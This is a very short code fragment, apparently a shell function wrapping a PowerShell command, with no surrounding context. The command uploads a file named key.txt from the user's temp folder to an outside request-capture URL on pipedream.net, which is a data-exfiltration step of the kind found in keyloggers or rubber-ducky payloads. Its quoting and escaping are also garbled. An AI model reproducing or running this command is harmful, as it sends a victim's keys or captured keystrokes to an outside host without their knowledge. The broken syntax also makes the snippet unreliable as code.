function wet-dog {
  \npowershell Invoke-WebRequest -Url https://en0501ny223ikh.x.pipedream.net/ -Method POST -ContentType 'text/plain'-InFile "\"`$env`:temp\\key.txt\
}
